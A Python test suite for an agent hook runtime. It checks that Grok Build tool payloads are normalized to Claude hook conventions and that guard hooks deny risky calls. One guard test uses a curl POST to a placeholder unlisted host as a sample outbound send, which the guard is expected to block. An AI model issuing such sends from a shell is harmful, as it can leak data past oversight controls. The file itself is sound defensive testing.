#!/usr/bin/env python3
"""Grok Build runs this repo's Claude settings hooks: its real payloads must get Claude's treatment.

The fixtures in ops/fixtures/grok-hooks are payloads grok 1.0.70 sent to a logging
hook (WR614.S1.J2), redacted. Grok sends Claude's snake_case keys beside its own
camelCase ones, but names tools its own way (run_terminal_command, write,
search_replace, read_file) and records the user turn in an ACP updates.jsonl.
"""
import importlib.util
import io
import json
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest

from git_env import fixture_env

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO))
from lib.hook_runtime import Event, decision, run  # noqa: E402

FIXTURES = REPO / 'ops/fixtures/grok-hooks'
spec = importlib.util.spec_from_file_location('grok_rule_hook', REPO / 'hooks/rule-pack-preuse-reselection.py')
assert spec is not None and spec.loader is not None
rule_hook = importlib.util.module_from_spec(spec)
spec.loader.exec_module(rule_hook)


def fixture(name, **changes):
    payload = json.loads((FIXTURES / f'{name}.json').read_text())
    payload['transcript_path'] = payload['transcriptPath'] = str(FIXTURES / 'updates.jsonl')
    payload['session_id'] = payload['sessionId'] = '00000000-0000-4000-8000-0000000000a1'
    payload.update(changes)
    return payload


def through_runtime(payload):
    """The event a gate sees when the harness hands it this payload on stdin."""
    seen = {}

    @decision
    def decide(event):
        seen.update(event)
    run(decide, stdin=io.StringIO(json.dumps(payload)), stdout=io.StringIO(), stderr=io.StringIO())
    return seen


class RuntimeNormalization(unittest.TestCase):
    def test_grok_tools_reach_gates_under_claude_names(self):
        expected = {'run_terminal_command': ('Bash', 'command'), 'write': ('Write', 'file_path'),
                    'search_replace': ('Edit', 'file_path'), 'read_file': ('Read', 'file_path')}
        for grok_name, (claude_name, key) in expected.items():
            with self.subTest(grok_name):
                event = through_runtime(fixture(f'pre_tool_use.{grok_name}'))
                self.assertEqual(event['tool_name'], claude_name)
                self.assertEqual(event['grok_tool_name'], grok_name)
                self.assertEqual(event['hook_event_name'], 'PreToolUse')
                self.assertTrue(event['tool_input'][key])

    def test_read_file_target_becomes_file_path(self):
        event = through_runtime(fixture('pre_tool_use.read_file'))
        self.assertEqual(event['tool_input']['file_path'], event['tool_input']['target_file'])

    def test_camel_case_only_payload_gets_claude_keys(self):
        payload = {k: v for k, v in fixture('pre_tool_use.run_terminal_command').items()
                   if not ('_' in k and k.islower())}
        event = through_runtime(payload)
        self.assertEqual((event['hook_event_name'], event['session_id'], event['tool_use_id'], event['tool_name']),
                         ('PreToolUse', payload['sessionId'], payload['toolUseId'], 'Bash'))

    def test_claude_and_codex_payloads_are_untouched(self):
        for payload in ({'hook_event_name': 'PreToolUse', 'session_id': 's', 'tool_use_id': 't',
                         'tool_name': 'read_file', 'tool_input': {'target_file': 'x'}},
                        {'hook_event_name': 'PreToolUse', 'session_id': 's', 'turn_id': 't',
                         'tool_name': 'exec_command', 'tool_input': {'cmd': 'ls'}}):
            with self.subTest(payload['tool_name']):
                self.assertEqual(through_runtime(payload), payload)

    def test_decide_called_with_a_plain_dict_is_normalized_too(self):
        @decision
        def decide(event):
            print(event['tool_name'])
        self.assertEqual(decide(fixture('pre_tool_use.run_terminal_command')).stdout, 'Bash\n')
        self.assertIsInstance(Event(), dict)


class RuleDelivery(unittest.TestCase):
    def invoke(self, payload, rows=()):
        source = {'ok': True, 'schema': 'rule-scope-catalog/v1', 'corpus_digest': 'a' * 64,
                  'identity': {'agent_principal_id': 'joe-local', 'runtime_principal': 'joe-local',
                               'sponsoring_human_id': 'joe'}, 'rules': list(rows)}
        runner = lambda command, **kwargs: subprocess.CompletedProcess(command, 0, json.dumps(source), '')
        return rule_hook.process(through_runtime(payload), runner=runner, dedupe=False, cache=False)

    def test_grok_user_turn_is_read_from_its_transcript(self):
        self.assertEqual(rule_hook.task_text(fixture('pre_tool_use.run_terminal_command')),
                         'run: git log --oneline -1')

    def test_grok_chunked_user_turn_is_joined_in_order(self):
        with tempfile.TemporaryDirectory() as raw:
            path = Path(raw) / 'updates.jsonl'
            lines = (FIXTURES / 'updates.jsonl').read_text().splitlines()
            chunk = json.loads(lines[1])
            rows = [lines[0]]
            for text in ('first half, ', 'second half'):
                chunk['params']['update']['content']['text'] = text
                rows.append(json.dumps(chunk))
            rows.append(json.dumps({'method': 'session/update', 'params': {'update': {
                'sessionUpdate': 'agent_message_chunk', 'content': {'type': 'text', 'text': 'reply'}}}}))
            path.write_text('\n'.join(rows) + '\n')
            self.assertEqual(rule_hook.task_text({'transcript_path': str(path),
                                                  'session_id': chunk['params']['sessionId']}), 'first half, second half')

    def prompt_chunk(self, index, text, *, session=None, meta=None):
        chunk = json.loads((FIXTURES / 'updates.jsonl').read_text().splitlines()[1])
        if session is not None:
            chunk['params']['sessionId'] = session
        update = chunk['params']['update']
        update['_meta'] = dict(promptIndex=index, **(meta or {}))
        update['content'] = text if isinstance(text, dict) else {'type': 'text', 'text': text}
        return chunk

    def read_prompt(self, chunks):
        with tempfile.TemporaryDirectory() as raw:
            path = Path(raw) / 'updates.jsonl'
            path.write_text(''.join(json.dumps(chunk) + '\n' for chunk in chunks))
            payload = fixture('pre_tool_use.run_terminal_command', transcript_path=str(path))
            return rule_hook.task_text(payload)

    def test_adjacent_prompt_indexes_are_not_joined(self):
        self.assertEqual(self.read_prompt([self.prompt_chunk(0, 'old'),
                                          self.prompt_chunk(1, 'new')]), 'new')

    def test_prompt_index_zero_chunks_survive_interleaved_updates(self):
        self.assertEqual(self.read_prompt([
            self.prompt_chunk(0, 'first '),
            {'method': 'session/update', 'params': {'update': {'sessionUpdate': 'agent_message_chunk'}}},
            self.prompt_chunk(0, 'second')]), 'first second')

    def test_newest_prompt_is_selected_by_index(self):
        self.assertEqual(self.read_prompt([self.prompt_chunk(2, 'new'),
                                          self.prompt_chunk(1, 'old')]), 'new')

    def test_foreign_session_chunk_is_excluded(self):
        self.assertEqual(self.read_prompt([self.prompt_chunk(0, 'human'),
                                          self.prompt_chunk(1, 'foreign', session='foreign-session')]), 'human')

    def test_host_and_interjection_chunks_are_excluded(self):
        for meta in ({'syntheticPrompt': True}, {'interjection': True}, {'origin': 'host'}):
            with self.subTest(meta=meta):
                self.assertEqual(self.read_prompt([self.prompt_chunk(0, 'human'),
                                                  self.prompt_chunk(1, 'host', meta=meta)]), 'human')

    def test_empty_newest_prompt_is_a_boundary(self):
        for content in ('', {'type': 'image', 'data': 'fixture'}):
            with self.subTest(content=content):
                self.assertEqual(self.read_prompt([self.prompt_chunk(0, 'old'),
                                                  self.prompt_chunk(1, content)]), '')

    def test_grok_shell_call_gets_rule_delivery_not_refusal(self):
        rule = dict(id='11111111', statement='Inspect the diff.', scope={'tools': ['Bash']}, personal_to=None)
        output = self.invoke(fixture('pre_tool_use.run_terminal_command'), [rule])
        context = output['hookSpecificOutput']
        self.assertNotIn('permissionDecision', context)
        row = json.loads(context['additionalContext'])
        self.assertEqual(row['rules'], [rule])
        self.assertNotIn('tool_name', row)
        self.assertNotIn('receipt_id', row)

    def test_grok_file_tools_with_no_rules_stay_silent(self):
        for name in ('write', 'search_replace', 'read_file'):
            with self.subTest(name):
                output = self.invoke(fixture(f'pre_tool_use.{name}'))
                self.assertIsNone(output)

    def test_grok_prompt_and_stop_are_not_refused(self):
        for name in ('user_prompt_submit', 'stop'):
            with self.subTest(name):
                output = self.invoke(fixture(name))
                self.assertFalse(output and output.get('decision') == 'block', output)

    def test_malformed_grok_payloads_still_refused(self):
        for drop in (('session_id', 'sessionId'), ('tool_use_id', 'toolUseId')):
            payload = fixture('pre_tool_use.run_terminal_command')
            for key in drop:
                payload.pop(key)
            with self.subTest(drop[0]):
                output = self.invoke(payload)
                self.assertEqual(output['hookSpecificOutput']['permissionDecision'], 'deny')
        output = self.invoke(fixture('pre_tool_use.run_terminal_command', transcript_path='/nonexistent',
                                     transcriptPath='/nonexistent'))
        self.assertEqual(output['hookSpecificOutput']['permissionDecision'], 'deny')


class SafetyGuards(unittest.TestCase):
    """The guards run as the harness runs them: a process fed the Grok payload on stdin."""

    def hook(self, script, payload):
        return subprocess.run([sys.executable, str(REPO / 'hooks' / script)], input=json.dumps(payload),
                              capture_output=True, text=True, timeout=30, env=fixture_env())

    def shell(self, command):
        payload = fixture('pre_tool_use.run_terminal_command')
        for key in ('tool_input', 'toolInput'):
            payload[key] = dict(payload[key], command=command)
        payload['cwd'] = str(REPO)
        return payload

    def test_guard_unattended_denies_a_grok_send_to_an_unlisted_host(self):
        result = self.hook('guard-unattended.py', self.shell(
            'curl -X POST -d probe=1 https://unlisted-api-host.example/api/auth.test'))
        self.assertEqual(result.returncode, 2, result.stderr)

    def test_guard_unattended_denies_truncated_grok_shell_input(self):
        payload = self.shell('echo ' + 'A' * 5000 + ' [truncated]')
        payload['toolInputTruncated'] = True
        result = self.hook('guard-unattended.py', payload)
        self.assertEqual(result.returncode, 2, result.stderr)
        self.assertIn('truncat', result.stderr.lower())

    def test_record_home_gate_denies_truncated_grok_write_input(self):
        payload = fixture('pre_tool_use.write', toolInputTruncated=True)
        result = self.hook('record-home-gate.py', payload)
        self.assertEqual(result.returncode, 2, result.stderr)
        self.assertIn('truncat', result.stderr.lower())

    def test_all_decorated_gates_deny_unconfirmed_grok_input(self):
        for flag in (True, None, 'false', 0):
            payload = self.shell('git log --oneline -1')
            if flag is not None:
                payload['toolInputTruncated'] = flag
            else:
                payload.pop('toolInputTruncated', None)
            for event in (payload, Event(payload)):
                with self.subTest(flag=flag, event_type=type(event).__name__):
                    @decision(on_error=lambda exc: 0)
                    def allow(event):
                        return 0
                    verdict = allow(event)
                    self.assertEqual(verdict.decision, 'deny')
                    self.assertIn('truncat', verdict.stderr.lower())

    def test_guard_unattended_allows_a_grok_read_only_command(self):
        result = self.hook('guard-unattended.py', self.shell('git log --oneline -1'))
        self.assertEqual(result.returncode, 0, result.stderr)

    def test_agent_card_gate_denies_a_grok_codex_launch_without_card(self):
        result = self.hook('agent-card-gate.py', self.shell('codex exec "Review the plan."'))
        self.assertEqual(result.returncode, 2, result.stderr)
        self.assertIn('agent-card-gate', result.stderr)


if __name__ == '__main__':
    unittest.main()
